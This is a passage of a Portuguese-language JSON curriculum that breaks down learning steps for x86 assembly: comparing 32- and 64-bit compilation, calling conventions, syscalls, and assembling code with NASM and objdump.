                              "practicalExample": "Usando o código C fornecido (int x=42; int *p=&x; printf(\"%p %d\\n\", p, *p);), compile com 'gcc -m32 -S prog.c' e 'gcc -m64 -S prog.c'. No 32 bits, veja 'movl $0x2a, %eax' (32-bit int) e ponteiro como 'leal -0x4(%ebp), %eax' (4 bytes). No 64 bits, 'movq $0x2a, %eax' e 'leaq -0x8(%rbp), %rax' (8 bytes), destacando registradores maiores e RIP-relative.",
                              "finalVerifications": [
                                "Compilação bem-sucedida de código idêntico em 32 e 64 bits sem erros.",
                                "Identificação correta de registradores: eax/esp (32) vs rax/rsp (64).",
                                "Reconhecimento de tamanhos de ponteiro: 4 bytes (32) vs 8 bytes (64).",
                                "Análise de pelo menos 3 diferenças em instruções (movl/movq, push/pop).",
                                "Geração de relatório comparativo com diff ou anotações manuais.",
                                "Execução dos binários gerados (gcc -m32 prog.c -o prog32) confirmando funcionalidade."
                              ],
                              "assessmentCriteria": [
                                "Precisão no uso de flags -m32/-m64 e -S (sem erros de compilação).",
                                "Identificação exata de diferenças em registradores e tamanhos de dados.",
                                "Análise profunda de pelo menos 5 linhas de código assembly contrastadas.",
                                "Clareza no relatório de comparação, com exemplos citados.",
                                "Compreensão de impactos: calling convention, stack frame (4 vs 8 bytes).",
                                "Tempo de execução dentro dos estimados, demonstrando eficiência."
                              ],
                              "crossCurricularConnections": [
                                "Arquitetura de Computadores: registradores, modos de endereçamento e ABI.",
                                "Segurança Computacional: reverse engineering de binários para detecção de exploits.",
                                "Programação em C: ponteiros, alocação de stack e otimização de compilador.",
                                "Sistemas Operacionais: compatibilidade binária e multilib.",
                                "Análise de Desempenho: impacto de arquitetura em velocidade e tamanho de código."
                              ],
                              "realWorldApplication": "Em segurança computacional, engenheiros de reverse engineering usam essa habilidade para desmontar malwares compilados para x86 (32 bits em sistemas legados) vs x64, identificando exploits que exploram diferenças em ponteiros (ex: buffer overflows com tamanhos variados) ou registradores em binários de diferentes plataformas."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.2.1.3.2",
                            "name": "Identificar convenções de chamada em 32 e 64 bits",
                            "description": "Analisar stack frames, passagem de parâmetros via stack (32 bits) versus registradores (64 bits) em funções geradas em assembly.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Convenções de Chamada em Arquitetura 32 bits",
                                  "subSteps": [
                                    "Estude a convenção cdecl: parâmetros passados da direita para a esquerda na stack, caller limpa a stack.",
                                    "Analise stdcall: parâmetros na stack, callee limpa a stack.",
                                    "Identifique o stack frame: EBP como base pointer, ESP como stack pointer.",
                                    "Examine prologue/epílogo: push ebp; mov ebp, esp; sub esp, N.",
                                    "Pratique visualizando o layout da stack com parâmetros e variáveis locais."
                                  ],
                                  "verification": "Desenhe o diagrama da stack para uma função com 3 parâmetros e confirme com um exemplo de assembly.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação Intel x86",
                                    "Compilador GCC 32 bits",
                                    "Ferramenta de disassemblador como objdump"
                                  ],
                                  "tips": "Use -m32 no GCC para gerar código 32 bits e foque em funções simples como soma de inteiros.",
                                  "learningObjective": "Dominar como parâmetros são passados via stack em 32 bits e estrutura do stack frame.",
                                  "commonMistakes": [
                                    "Confundir caller e callee na limpeza da stack",
                                    "Ignorar alinhamento da stack (geralmente 4 bytes)",
                                    "Esquecer de considerar registradores como EAX para retorno"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Compreender Convenções de Chamada em Arquitetura 64 bits",
                                  "subSteps": [
                                    "Estude System V AMD64 ABI (Linux): primeiros 6 inteiros em RDI, RSI, RDX, RCX, R8, R9; resto na stack.",
                                    "Analise Windows x64: RCX, RDX, R8, R9; resto na stack, com shadow space.",
                                    "Identifique o stack frame: RBP opcional, RSP como stack pointer, alinhamento 16 bytes.",
                                    "Examine prologue: push rbp; mov rbp, rsp; sub rsp, N (alinhado).",
                                    "Visualize red zone (Linux) e shadow space (Windows)."
                                  ],
                                  "verification": "Liste os registradores para os primeiros parâmetros em ambas ABIs e compare com stack overflow.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação AMD64 ABI",
                                    "Compilador GCC/Clang 64 bits",
                                    "Ferramenta objdump ou Ghidra"
                                  ],
                                  "tips": "Compile com -m64 e use 'objdump -d' para inspecionar funções; teste com flags como -fno-omit-frame-pointer.",
                                  "learningObjective": "Entender passagem de parâmetros via registradores em 64 bits e diferenças entre ABIs.",
                                  "commonMistakes": [
                                    "Assumir stack para todos parâmetros",
                                    "Ignorar calling convention específica (System V vs MS)",
                                    "Esquecer alinhamento 16 bytes"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Comparar Stack Frames e Passagem de Parâmetros entre 32 e 64 bits",
                                  "subSteps": [
                                    "Compile a mesma função C em 32 e 64 bits e disassemble ambas.",
                                    "Identifique diferenças: stack vs registradores para parâmetros.",
                                    "Analise acesso a parâmetros: [ebp + offset] em 32 bits vs mov rdi, [rbp+offset] em 64.",
                                    "Compare prologue/epílogo e tamanho do stack frame.",
                                    "Anote variações baseadas em número de parâmetros (>6 em 64 bits vai para stack)."
                                  ],
                                  "verification": "Crie uma tabela comparativa de uma função com 4 parâmetros e valide com assembly gerado.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Código C simples (ex: int func(int a, int b, int c, int d))",
                                    "GCC com -m32/-m64",
                                    "Objdump ou IDA Free"
                                  ],
                                  "tips": "Use atribuições diretas de parâmetros para forçar acessos visíveis no assembly.",
                                  "learningObjective": "Comparar e contrastar convenções de 32 vs 64 bits em stack frames reais.",
                                  "commonMistakes": [
                                    "Não considerar otimização que remove frame pointer",
                                    "Confundir offsets absolutos vs relativos",
                                    "Ignorar convenções de ponto flutuante (XMM regs)"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Praticar Identificação em Código Assembly Real",
                                  "subSteps": [
                                    "Selecione um binário ou função assembly de exemplo (ex: de CTF ou debugger).",
                                    "Disassemble e classifique a arquitetura (32/64).",
                                    "Identifique parâmetros: rastreie uso de stack ou registradores específicos.",
                                    "Simule execução passo a passo com debugger.",
                                    "Documente convenção detectada e valide com chamada real."
                                  ],
                                  "verification": "Analise 3 funções diferentes e rotule corretamente cada uma como 32/64 com justificativa.",
                                  "estimatedTime": "75 minutos",
                                  "materials": [
                                    "GDB ou WinDbg",
                                    "Binários de teste (ex: de picoCTF)",
                                    "Ghidra ou Radare2"
                                  ],
                                  "tips": "Use 'info registers' no GDB para observar registradores durante chamadas; foque em funções não inline.",
                                  "learningObjective": "Aplicar conhecimento para identificar convenções em assembly desconhecido.",
                                  "commonMistakes": [
                                    "Assumir arquitetura sem verificar header PE/ELF",
                                    "Não rastrear caller para parâmetros passados",
                                    "Confundir locals com parâmetros"
                                  ]
                                }
                              ],
                              "practicalExample": "Compile 'int add(int a, int b, int c) { return a + b + c; }' em 32 bits (gcc -m32 -S) e 64 bits (gcc -S). Disassemble: em 32 bits, parâmetros em [ebp+8], [ebp+12], [ebp+16]; em 64 bits, rdi, rsi, rdx. Identifique mov eax, [ebp+8] vs mov eax, edi.",
                              "finalVerifications": [
                                "Pode listar registradores exatos para parâmetros em AMD64 System V.",
                                "Desenha stack frame correto para 32 bits com 4 parâmetros.",
                                "Identifica diferenças em prologue entre 32/64 bits em assembly.",
                                "Rastreia parâmetros em uma função disassemblada sem erros.",
                                "Explica por que 64 bits usa registradores (performance).",
                                "Valida com debugger em tempo real."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de convenções (100% correto em 5 exemplos).",
                                "Explicação clara de stack vs registradores com diagramas.",
                                "Análise correta de offsets e alinhamentos.",
                                "Detecção de ABI específica (System V vs MS).",
                                "Aplicação em cenários reais sem dicas.",
                                "Tempo de análise <5 min por função simples."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C/Assembly: Entender como código fonte vira binário.",
                                "Reverse Engineering: Base para análise de malware e exploits.",
                                "Sistemas Operacionais: ABIs definem interfaces kernel/user.",
                                "Segurança Computacional: Buffer overflows dependem de stack layout.",
                                "Arquitetura de Computadores: Evolução x86 para x86-64."
                              ],
                              "realWorldApplication": "Em análise de segurança, identificar convenções permite mapear funções em binários desstripados, detectar ROP gadgets em stack frames e explorar vulnerabilidades como stack overflows adaptadas a 32/64 bits em ambientes mistos (ex: legacy software ou cross-platform malware)."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.2.1.3.3",
                            "name": "Examinar acesso a memória e syscalls",
                            "description": "Comparar instruções MOV para acessos de memória e INT 0x80 (32 bits) versus SYSCALL (64 bits) em assembly gerado para operações de I/O.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Revisar instruções MOV para acessos de memória em x86 (32 bits) e x86-64",
                                  "subSteps": [
                                    "Estude a sintaxe de MOV em assembly x86: MOV reg, mem e MOV mem, reg.",
                                    "Compile um programa C simples com acesso a variável global usando gcc -m32 -S.",
                                    "Examine o .s gerado com um editor de texto para identificar padrões de MOV.",
                                    "Repita para x86-64 sem flag -m32 e note diferenças em endereçamento (ex: RIP-relative).",
                                    "Anote como MOV carrega argumentos de memória para registradores em ambos os modos."
                                  ],
                                  "verification": "Liste 3 exemplos de MOV de memória para registrador em assembly 32 e 64 bits de um programa de teste.",
                                  "estimatedTime": "45 minutes",
                                  "materials": [
                                    "GCC com suporte a multilib",
                                    "Editor de texto (vim/nano)",
                                    "Exemplo C simples com variáveis globais"
                                  ],
                                  "tips": [
                                    "Use 'gcc -S -m32 file.c' para gerar .s; compare com 'objdump -d a.out'.",
                                    "Foque em operandos como [ebp+offset] vs [rip+offset]."
                                  ],
                                  "learningObjective": "Compreender como MOV prepara dados de memória para operações subsequentes em 32 e 64 bits.",
                                  "commonMistakes": [
                                    "Confundir registradores de 32 bits (EAX) com 64 bits (RAX).",
                                    "Ignorar modos de endereçamento relativos em 64 bits."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar syscalls em 32 bits usando INT 0x80",
                                  "subSteps": [
                                    "Escreva um programa C que usa write() para stdout.",
                                    "Compile para 32 bits: gcc -m32 -nostdlib -o prog32 prog.c e linke manualmente se necessário.",
                                    "Use objdump -d prog32 para disassemblar e localize INT 0x80.",
                                    "Identifique como EAX recebe o número da syscall (ex: 4 para write) e argumentos em EBX, ECX, EDX via MOV.",
                                    "Execute em gdb 32 bits e trace o INT 0x80 para confirmar interrupção."
                                  ],
                                  "verification": "Extraia snippet de assembly mostrando MOVs preparando args e INT 0x80.",
                                  "estimatedTime": "60 minutes",
                                  "materials": [
                                    "GCC multilib",
                                    "objdump",
                                    "gdb (32-bit version via multilib)",
                                    "Programa C com write(1, buf, len)"
                                  ],
                                  "tips": [
                                    "Sistema de chamadas Linux 32 bits: args em EBX/ECX/EDX, EAX=num syscall.",
                                    "Evite stdlib para ver syscalls cruas."
                                  ],
                                  "learningObjective": "Identificar e decodificar sequências de INT 0x80 para I/O em binários 32 bits.",
                                  "commonMistakes": [
                                    "Assumir SYSCALL em 32 bits; INT 0x80 é legacy.",
                                    "Errar ordem de argumentos nos registradores."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar syscalls em 64 bits usando SYSCALL",
                                  "subSteps": [
                                    "Modifique o programa C para 64 bits (padrão).",
                                    "Compile: gcc -nostdlib -o prog64 prog.c e disassemble com objdump -d.",
                                    "Localize instrução SYSCALL e note RAX=num syscall, args em RDI/RSI/RDX/etc.",
                                    "Observe MOVs carregando args de memória para registradores de 64 bits.",
                                    "Use gdb para set breakpoint em SYSCALL e examine registradores."
                                  ],
                                  "verification": "Documente snippet mostrando MOVs para RDI/RSI e SYSCALL.",
                                  "estimatedTime": "50 minutes",
                                  "materials": [
                                    "GCC padrão 64 bits",
                                    "objdump",
                                    "gdb",
                                    "Programa C idêntico ao de 32 bits"
                                  ],
                                  "tips": [
                                    "Linux x86-64: args em RDI, RSI, RDX, R10, R8, R9.",
                                    "SYSCALL é mais rápida que INT 80."
                                  ],
                                  "learningObjective": "Diferenciar preparação de argumentos e execução de SYSCALL em 64 bits.",
                                  "commonMistakes": [
                                    "Usar convenção 32 bits para args 64 bits.",
                                    "Confundir RAX com EAX em dumps."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Comparar acessos MOV e syscalls entre 32 e 64 bits em assembly de I/O",
                                  "subSteps": [
                                    "Alinhe side-by-side os dumps de objdump de prog32 e prog64.",
                                    "Compare MOVs: tamanhos de registrador, modos de endereçamento, offsets.",
                                    "Destaque diferenças em syscalls: INT 0x80 (EBP stack) vs SYSCALL (RBP).",
                                    "Teste variação com printf() para mais I/O e repita análise.",
                                    "Crie tabela resumindo 5 diferenças chave."
                                  ],
                                  "verification": "Produza tabela comparativa com pelo menos 5 diferenças identificadas.",
                                  "estimatedTime": "40 minutes",
                                  "materials": [
                                    "Dois arquivos objdump lado a lado (editor com split ou diff tool)",
                                    "Tabela em Markdown ou planilha"
                                  ],
                                  "tips": [
                                    "Use 'diff -y file32.s file64.s' para visual alinhado.",
                                    "Foque em prologue/epilogue também afetando acessos."
                                  ],
                                  "learningObjective": "Sintetizar diferenças para análise de binários híbridos ou migrações.",
                                  "commonMistakes": [
                                    "Ignorar alinhamento de stack/padding em 64 bits.",
                                    "Não notar otimizações do compilador."
                                  ]
                                }
                              ],
                              "practicalExample": "Compile 'int main() { char buf[]=\"Hello\"; write(1, buf, 5); }' com gcc -m32 -nostdlib -o hello32 hello.c; objdump -d hello32 mostra MOVs para EBX/ECX/EDX e INT 0x80. Para 64 bits: gcc -nostdlib -o hello64 hello.c; objdump revela MOVs para RDI/RSI/RDX e SYSCALL.",
                              "finalVerifications": [
                                "Identifica corretamente MOVs preparando memória para args em ambos os arquiteturas.",
                                "Distingue INT 0x80 (32 bits, interrupção) de SYSCALL (64 bits, instrução rápida).",
                                "Lista registradores corretos: EBX/ECX/EDX vs RDI/RSI/RDX.",
                                "Explica impacto em análise de binários (ex: detecção de arquitetura).",
                                "Demonstra com objdump de programa real.",
                                "Nota diferenças em endereçamento de memória (RIP-relative em 64 bits)."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de instruções MOV e syscalls (90%+ acerto).",
                                "Compreensão profunda das convenções de chamada (args/registradores).",
                                "Qualidade da comparação tabular ou visual.",
                                "Uso correto de ferramentas (gcc, objdump, gdb).",
                                "Explicação de implicações para I/O e segurança.",
                                "Ausência de confusões entre 32/64 bits."
                              ],
                              "crossCurricularConnections": [
                                "Arquitetura de Computadores: Modos de endereçamento e registradores.",
                                "Sistemas Operacionais: Mecanismos de system calls e traps.",
                                "Segurança Computacional: Análise de binários para exploits de syscall.",
                                "Engenharia de Software: Migração de código legado 32 para 64 bits.",
                                "Análise Reversiva: Disassembly e debugging dinâmico."
                              ],
                              "realWorldApplication": "Em reverse engineering de malware, onde atacantes exploram syscalls personalizadas; auditoria de binários para compatibilidade 32/64 bits em ambientes mistos; ou debugging de falhas I/O em software embarcado legado."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.1.3",
                    "name": "Montagem e Criação de Código Objeto",
                    "description": "Conversão de código assembly em arquivos objeto binários com símbolos e relocações.",
                    "individualConcepts": [
                      {
                        "id": "10.1.1.3.1",
                        "name": "Processo de Montagem de Código Assembly",
                        "description": "Entende o funcionamento do montador (assembler) que converte código assembly legível em código objeto binário, incluindo a geração inicial de instruções máquina e preparação para linkage.",
                        "specificSkills": [
                          {
                            "id": "10.1.1.3.1.1",
                            "name": "Identificar sintaxe básica de assembly para montagem",
                            "description": "Reconhecer elementos como diretivas (.section, .global), labels, instruções (mov, call) e pseudo-instruções em assembly x86 32/64 bits usando ferramentas como NASM ou GAS.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender diretivas básicas de assembly",
                                  "subSteps": [
                                    "Estude as diretivas comuns como .section, .data, .bss, .text e .global.",
                                    "Identifique o propósito de cada: .section define seções, .global torna símbolos visíveis externamente.",
                                    "Leia exemplos na documentação oficial do NASM ou GAS.",
                                    "Compare sintaxe NASM (Intel) vs GAS (AT&T).",
                                    "Anote diferenças chave em um caderno."
                                  ],
                                  "verification": "Liste 5 diretivas com suas funções sem consultar materiais.",
                                  "estimatedTime": "20-30 minutos",
                                  "materials": [
                                    "Documentação NASM (nasm.us/doc/), Documentação GAS (sourceware.org/binutils/docs/as/)",
                                    "Editor de texto (VS Code ou Vim)"
                                  ],
                                  "tips": "Comece com NASM por ser mais intuitiva para iniciantes em x86.",
                                  "learningObjective": "Reconhecer e explicar o papel das diretivas na estrutura de um arquivo assembly.",
                                  "commonMistakes": [
                                    "Confundir .global com .extern (um declara, outro importa).",
                                    "Ignorar que diretivas são case-sensitive em alguns assemblers."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar labels e comentários",
                                  "subSteps": [
                                    "Aprenda que labels são identificadores terminados por : (ex: loop:).",
                                    "Estude comentários: ; em NASM, # ou /* */ em GAS.",
                                    "Analise como labels marcam endereços para jumps/calls.",
                                    "Pratique renomeando labels em um snippet simples.",
                                    "Diferencie labels locais (ex: .Llabel) de globais."
                                  ],
                                  "verification": "Em um código fornecido, circule todos os labels e explique seu uso.",
                                  "estimatedTime": "15-25 minutos",
                                  "materials": [
                                    "Snippets de código assembly de exemplo (github.com/search?q=nasm+hello+world)",
                                    "Instalador NASM (nasm.us/pub/nasm/releasebuilds/)"
                                  ],
                                  "tips": "Labels devem ser únicos no escopo; use prefixos para organização.",
                                  "learningObjective": "Localizar e diferenciar labels de outros elementos sintáticos.",
                                  "commonMistakes": [
                                    "Esquecer o ':' no final do label.",
                                    "Usar labels com caracteres inválidos (espaços, símbolos especiais)."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Reconhecer instruções e pseudo-instruções básicas",
                                  "subSteps": [
                                    "Liste instruções comuns: mov (move), call (chamada), jmp (salto), add/sub (aritmética).",
                                    "Estude pseudo-instruções como times (repetição), equ (equates).",
                                    "Compare operandos: registradores (eax, ebx), imediatos (#5), memória [endereço].",
                                    "Pratique decodificando 10 instruções de um dump.",
                                    "Note modos 32/64 bits (e.g., eax vs rax)."
                                  ],
                                  "verification": "Classifique 10 linhas de código como instruções reais ou pseudo.",
                                  "estimatedTime": "25-35 minutos",
                                  "materials": [
                                    "Referência Intel x86 (intel.com/content/www/us/en/developer/articles/technical/intel-sdm.html)",
                                    "Ferramenta objdump para dumps"
                                  ],
                                  "tips": "Memorize registradores principais: EAX, EBX, ECX, EDX, ESP, EBP.",
                                  "learningObjective": "Distinguir e nomear instruções básicas vs pseudo-instruções.",
                                  "commonMistakes": [
                                    "Confundir registradores 32-bit (eax) com 64-bit (rax).",
                                    "Esquecer prefixos de tamanho (dword ptr)."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar sintaxe em um código assembly completo",
                                  "subSteps": [
                                    "Baixe um exemplo 'hello world' em NASM/GAS.",
                                    "Identifique todas as partes: diretivas, labels, instruções.",
                                    "Monte o código com nasm -f elf32 arquivo.asm ou as --32 arquivo.s.",
                                    "Examine erros de sintaxe intencionalmente introduzidos.",
                                    "Compare saída de NASM vs GAS."
                                  ],
                                  "verification": "Monte um código sem erros e descreva cada linha.",
                                  "estimatedTime": "30-45 minutos",
                                  "materials": [
                                    "NASM/GAS instalados",
                                    "Terminal/Linux ou WSL",
                                    "Exemplo: section .data; msg db 'Hello',10; section .text; global _start; _start: mov eax,4; ..."
                                  ],
                                  "tips": "Use -Wall no NASM para warnings detalhados.",
                                  "learningObjective": "Integrar todos os elementos em uma análise holística de código.",
                                  "commonMistakes": [
                                    "Ordem errada de seções (.data antes de .text).",
                                    "Falta de exit syscall no final."
                                  ]
                                }
                              ],
                              "practicalExample": "Exemplo NASM x86-32 'Hello World':\nsection .data\n    msg db 'Hello, World!', 0xa\n    len equ $ - msg\nsection .text\n    global _start\n_start:\n    mov eax, 4      ; sys_write\n    mov ebx, 1      ; stdout\n    mov ecx, msg\n    mov edx, len\n    int 0x80        ; interrupt\n    mov eax, 1      ; sys_exit\n    xor ebx, ebx\n    int 0x80\nAnálise: .section define dados/texto; .global exporta _start; mov carrega valores; int chama kernel.",
                              "finalVerifications": [
                                "Identificar corretamente todas as diretivas em um snippet aleatório.",
                                "Listar labels e suas funções em código fornecido.",
                                "Classificar instruções como data movement, control flow ou arithmetic.",
                                "Montar um código simples sem erros de sintaxe.",
                                "Explicar diferenças NASM vs GAS em um exemplo misto."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação: 90%+ correto.",
                                "Completude: Cobrir todos os elementos (diretivas, labels, instruções).",
                                "Explicação clara: Justificar escolhas com referências sintáticas.",
                                "Uso correto de ferramentas: Montagem bem-sucedida.",
                                "Criatividade: Adaptar exemplo para variação 64-bit."
                              ],
                              "crossCurricularConnections": [
                                "Arquitetura de Computadores (registradores e memória).",
                                "Programação em C (linkage com assembly via extern).",
                                "Engenharia Reversa (análise de binários com objdump/IDA).",
                                "Segurança Computacional (entender exploits em shellcode).",
                                "Algoritmos (otimização de loops em baixo nível)."
                              ],
                              "realWorldApplication": "Na análise de malware ou vulnerabilidades (e.g., buffer overflow), engenheiros de segurança dissecam binários para identificar shellcodes em assembly, usando essa sintaxe para recriar exploits ou patches em ferramentas como Ghidra ou Radare2."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.3.1.2",
                            "name": "Executar montagem de código assembly simples",
                            "description": "Usar comandos como 'nasm -f elf64 arquivo.asm -o arquivo.o' para gerar arquivos objeto a partir de código assembly, verificando saída com 'objdump -d arquivo.o'.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar o ambiente de desenvolvimento",
                                  "subSteps": [
                                    "Instale o NASM no sistema operacional (ex: apt install nasm no Linux ou brew install nasm no macOS).",
                                    "Verifique a instalação executando 'nasm --version' no terminal.",
                                    "Instale o binutils para objdump (geralmente vem com gcc: apt install binutils).",
                                    "Verifique objdump com 'objdump --version'.",
                                    "Crie um diretório de trabalho: mkdir assembly_lab && cd assembly_lab."
                                  ],
                                  "verification": "Comandos 'nasm --version' e 'objdump --version' retornam versões válidas sem erros.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Terminal ou prompt de comando",
                                    "Acesso de administrador para instalação",
                                    "Internet para downloads"
                                  ],
                                  "tips": "Use um ambiente virtual como Docker com Ubuntu para evitar conflitos no sistema principal.",
                                  "learningObjective": "Preparar ferramentas essenciais para montagem de assembly.",
                                  "commonMistakes": [
                                    "Esquecer de atualizar o PATH após instalação",
                                    "Instalar versão errada para a arquitetura (32/64 bits)",
                                    "Não verificar versões antes de prosseguir"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Criar um arquivo de código assembly simples",
                                  "subSteps": [
                                    "Abra um editor de texto (vim, nano ou VS Code).",
                                    "Escreva um código minimalista, ex: section .text\nglobal _start\n_start:\nmov rax, 60\nxor rdi, rdi\nsyscall.",
                                    "Salve o arquivo como 'hello.asm' no diretório de trabalho.",
                                    "Verifique sintaxe básica com 'cat hello.asm' ou abra no editor.",
                                    "Confirme que o código usa sintaxe compatível com NASM (Intel syntax)."
                                  ],
                                  "verification": "Arquivo hello.asm existe e contém código assembly válido sem erros de digitação.",
                                  "estimatedTime": "10 minutos",
                                  "materials": [
                                    "Editor de texto",
                                    "Conhecimento básico de sintaxe assembly x86-64"
                                  ],
                                  "tips": "Comece com syscalls Linux para simplicidade; evite dependências externas.",
                                  "learningObjective": "Produzir código assembly fonte acionável.",
                                  "commonMistakes": [
                                    "Usar sintaxe AT&T em vez de Intel",
                                    "Esquecer section .text",
                                    "Erros de indentação ou aspas"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Executar a montagem com NASM",
                                  "subSteps": [
                                    "No terminal, execute: nasm -f elf64 hello.asm -o hello.o",
                                    "Observe a saída do comando para erros de sintaxe.",
                                    "Verifique se o arquivo hello.o foi criado com 'ls -la hello.o'.",
                                    "Confira o tamanho do arquivo (deve ser pequeno, ~100-200 bytes).",
                                    "Anote qualquer warning ou erro na saída."
                                  ],
                                  "verification": "Arquivo hello.o gerado com sucesso e sem erros no comando NASM.",
                                  "estimatedTime": "5 minutos",
                                  "materials": [
                                    "Terminal no diretório com hello.asm"
                                  ],
                                  "tips": "Use -f elf64 para x86-64 Linux; ajuste para win64 se necessário (-f win64).",
                                  "learningObjective": "Gerar arquivo objeto a partir de assembly usando NASM.",
                                  "commonMistakes": [
                                    "Formato de saída errado (-f)",
                                    "Nome de arquivo incorreto",
                                    "Executar em diretório errado"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Verificar o arquivo objeto com objdump",
                                  "subSteps": [
                                    "Execute: objdump -d hello.o",
                                    "Analise a saída para ver o disassembly do código montado.",
                                    "Confirme que as instruções mov rax,60; xor rdi,rdi; syscall aparecem corretamente.",
                                    "Salve a saída em um arquivo: objdump -d hello.o > hello_disasm.txt",
                                    "Compare com o código fonte esperado."
                                  ],
                                  "verification": "Disassembly no objdump corresponde ao código assembly fonte.",
                                  "estimatedTime": "10 minutos",
                                  "materials": [
                                    "Terminal",
                                    "Conhecimento básico de instruções assembly"
                                  ],
                                  "tips": "Use -M intel para sintaxe Intel no objdump se necessário.",
                                  "learningObjective": "Inspecionar e validar código objeto gerado.",
                                  "commonMistakes": [
                                    "Comando errado (objdump -D em vez de -d)",
                                    "Arquivo .o não encontrado",
                                    "Ignorar símbolos undefined"
                                  ]
                                }
                              ],
                              "practicalExample": "Crie hello.asm com: section .text\nglobal _start\n_start:\nmov rax, 60\nmov rdi, 0\nsyscall. Execute 'nasm -f elf64 hello.asm -o hello.o' (saída: sem erros). Então 'objdump -d hello.o' mostra: 48 c7 c0 3c 00 00 00 (mov rax,0x3c), 48 31 ff (xor rdi,rdi), 0f 05 (syscall).",
                              "finalVerifications": [
                                "Arquivo .o criado com tamanho apropriado (>0 bytes).",
                                "Comando NASM executado sem erros ou warnings críticos.",
                                "Objdump exibe disassembly idêntico ao código fonte.",
                                "Nenhum erro de linking prematuro (apenas montagem).",
                                "Saída salvável e comparável.",
                                "Ambiente reproduzível em outra sessão."
                              ],
                              "assessmentCriteria": [
                                "Precisão dos comandos NASM e objdump (100% correto).",
                                "Código assembly sintaticamente válido e montável.",
                                "Interpretação correta da saída de objdump.",
                                "Identificação de discrepâncias entre fonte e objeto.",
                                "Eficiência no tempo (dentro de 40 minutos totais).",
                                "Documentação de saídas e observações."
                              ],
                              "crossCurricularConnections": [
                                "Programação de Sistemas: Entender pipeline de compilação.",
                                "Segurança Computacional: Base para análise de binários maliciosos.",
                                "Arquitetura de Computadores: Instruções de máquina x86-64.",
                                "Engenharia de Software: Ferramentas de build e debugging."
                              ],
                              "realWorldApplication": "Em reverse engineering de malware, desenvolvedores usam NASM/objdump para testar exploits ou analisar firmwares embarcados, garantindo compreensão de código de baixo nível em auditorias de segurança."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.3.1.3",
                            "name": "Diferenciar montagem em 32 e 64 bits",
                            "description": "Comparar flags de montagem (-f elf32 vs -f elf64) e impactos em registradores (EAX vs RAX), chamadas de sistema (int 0x80 vs syscall) e tamanho de ponteiros.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Revisar arquitetura x86 32-bit e processo de montagem",
                                  "subSteps": [
                                    "Instale o NASM assembler em seu ambiente Linux (ex: sudo apt install nasm).",
                                    "Crie um arquivo assembly simples usando registradores 32-bit como EAX, EBX.",
                                    "Escreva código com syscall int 0x80 para saída (ex: sys_write).",
                                    "Monte com comando: nasm -f elf32 arquivo.asm -o arquivo.o.",
                                    "Linke com ld -m elf_i386 arquivo.o -o executavel."
                                  ],
                                  "verification": "Execute o binário e confirme saída correta; use objdump -d para verificar instruções 32-bit.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "NASM instalado",
                                    "Linux/WSL",
                                    "Editor de texto (vim/nano)",
                                    "ld linker"
                                  ],
                                  "tips": "Use registradores de 32-bit explicitamente para evitar extensões automáticas.",
                                  "learningObjective": "Compreender convenções e flags específicas para montagem 32-bit.",
                                  "commonMistakes": [
                                    "Esquecer flag -f elf32",
                                    "Usar registradores 64-bit em código 32-bit",
                                    "Não especificar -m elf_i386 no ld"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar arquitetura x86-64 e processo de montagem",
                                  "subSteps": [
                                    "Crie arquivo assembly similar, mas usando RAX, RBX para 64-bit.",
                                    "Substitua int 0x80 por syscall instruction.",
                                    "Monte com: nasm -f elf64 arquivo.asm -o arquivo.o.",
                                    "Linke com ld arquivo.o -o executavel (padrão 64-bit).",
                                    "Observe tamanho maior de ponteiros (8 bytes vs 4)."
                                  ],
                                  "verification": "Execute e disassemble com objdump -d; confirme uso de RAX e syscall.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "NASM",
                                    "Linux 64-bit",
                                    "objdump (parte de binutils)"
                                  ],
                                  "tips": "Em 64-bit, argumentos de syscall vão em registradores (RDX, RSI, etc.), não pilha.",
